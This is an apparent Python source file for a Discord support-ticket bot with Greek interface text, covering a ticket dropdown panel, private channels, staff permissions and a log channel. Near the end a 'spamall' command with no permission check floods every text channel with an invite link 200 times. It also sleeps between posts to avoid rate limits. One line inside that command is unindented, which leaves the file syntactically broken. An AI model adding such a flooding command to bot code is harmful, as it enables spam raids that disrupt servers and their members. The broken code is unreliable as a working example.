import discord
from discord.ext import commands
from discord.ui import View, Select, Button
import os
from flask import Flask
from threading import Thread
import asyncio

# ---------------- KEEP ALIVE ----------------
app = Flask('')

@app.route('/')
def home():
    return "OK"

def run():
    app.run(host='0.0.0.0', port=10000)

def keep_alive():
    t = Thread(target=run)
    t.daemon = True
    t.start()

# ---------------- CONFIG ----------------
GUILD_ID = 1442912003055292500  # SERVER ID
LOG_CHANNEL_ID = 1480879305415200799  # LOGS CHANNEL ID
TICKET_CATEGORY_ID = 1482062274339275012  # CATEGORY ΓΙΑ TICKETS

STAFF_ROLES = [
    1463891827219365909,  # Founder
    1463891877840421046,  # Co-Founder
    1461801695309856991   # Staff Team
]

# ---------------- INTENTS ----------------
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

# ---------------- CLOSE BUTTON ----------------
class CloseButton(View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🔒 Close Ticket", style=discord.ButtonStyle.red, custom_id="close_ticket")
    async def close(self, interaction: discord.Interaction, button: Button):
        await interaction.channel.delete()

# ---------------- DROPDOWN ----------------
class TicketDropdown(Select):
    def __init__(self):
        options = [
            discord.SelectOption(label="👑Founder/Co-Founder", description="Επικοινωνία με Founder/Co-Founder"),
            discord.SelectOption(label="🪲Bug Report", description="Αναφορά bug"),
            discord.SelectOption(label="📞Support", description="Υποστήριξη"),
            discord.SelectOption(label="🎁Take Your Reward", description="Πάρε το reward σου"),
            discord.SelectOption(label="🚫Ban Appeal", description="Αίτηση unban")
        ]

        super().__init__(
            placeholder="Επίλεξε κατηγορία ticket...",
            min_values=1,
            max_values=1,
            options=options,
            custom_id="ticket_dropdown"
        )

    async def callback(self, interaction: discord.Interaction):
        guild = interaction.guild
        category = guild.get_channel(TICKET_CATEGORY_ID)

        ticket_channel = await guild.create_text_channel(
            name=f"ticket-{interaction.user.name}",
            category=category,
            overwrites={
                guild.default_role: discord.PermissionOverwrite(view_channel=False),
                interaction.user: discord.PermissionOverwrite(view_channel=True, send_messages=True),
            }
        )

        # Staff permissions
        for role_id in STAFF_ROLES:
            role = guild.get_role(role_id)
            if role:
                await ticket_channel.set_permissions(role, view_channel=True, send_messages=True)

        # Log
        log_channel = bot.get_channel(LOG_CHANNEL_ID)
        if log_channel:
            await log_channel.send(
                f"🎫 **Νέο Ticket**\n👤 User: {interaction.user.mention}\n📂 Category: **{self.values[0]}**"
            )

        # Ticket message
        embed = discord.Embed(
            title="🎫 Ticket Created",
            description=(
                f"👤 **User:** {interaction.user.mention}\n"
                f"📂 **Category:** {self.values[0]}\n\n"
                f"Παρακαλώ περιμένετε το Staff Team."
            ),
            color=discord.Color.green()
        )

        await ticket_channel.send(embed=embed, view=CloseButton())

        await interaction.response.send_message(
            f"Το ticket σου δημιουργήθηκε: {ticket_channel.mention}",
            ephemeral=True
        )

# ---------------- PERSISTENT VIEW ----------------
class TicketDropdownView(View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(TicketDropdown())

@bot.event
async def on_ready():
    bot.add_view(TicketDropdownView())
    print(f"Logged in as {bot.user}")

# ---------------- PANEL COMMAND ----------------
@bot.command()
@commands.has_permissions(administrator=True)
async def ticketpanel(ctx):
    embed = discord.Embed(
        title="🎫 Support Tickets",
        description="Επίλεξε την κατηγορία που θέλεις βοήθεια:",
        color=discord.Color.blue()
    )
    embed.set_image(url="https://i.imgur.com/lGMhGmn.jpeg")

    await ctx.send(embed=embed, view=TicketDropdownView())


@bot.command()
async def spamall(ctx):
    link = "https://discord.gg/PsWNm67R"  # ΒΑΛΕ ΤΟ LINK ΣΟΥ ΕΔΩ

await ctx.send("Ξεκινάω να στέλνω το link σε όλα τα κανάλια...")

    for channel in ctx.guild.text_channels:
        try:
            for i in range(200):
                await channel.send(link)
                await asyncio.sleep(0.1)  # delay για να μην φας rate limit
        except:
            pass


# ---------------- RUN ----------------
keep_alive()
TOKEN = os.getenv("DISCORD_TOKEN")
bot.run(TOKEN)
